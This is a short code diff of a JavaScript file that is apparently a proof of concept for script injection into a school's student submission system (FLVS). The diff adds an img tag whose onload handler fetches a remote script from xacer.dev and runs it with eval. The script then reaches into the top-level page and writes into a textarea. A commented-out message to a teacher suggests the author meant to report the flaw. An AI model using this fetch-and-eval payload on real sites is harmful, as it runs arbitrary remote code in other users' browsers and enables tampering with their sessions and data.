@@ -1,10 +1,13 @@
 
-// <img onload="" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >
+// <img onload="fetch('https://xacer.dev/misc/hax.js').then(r=>r.text()).then(t=>eval(t))" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >
 
 const doc = window.top.document;
 
 const textArea = doc.querySelector("textarea[dir=\"ltr\"]");
 
+textArea.textContent = "Hello World";
+
+/*
 const message = "Hello Mrs. Rakestraw. I have found a strange vulnerability in FLVS's student submission system.";
 
 let idx = 1;
@@ -23,3 +26,4 @@ let interval = setInterval(() => {
     if (idx >= message.length) clearInterval(interval);
 
 }, 500);
+*/
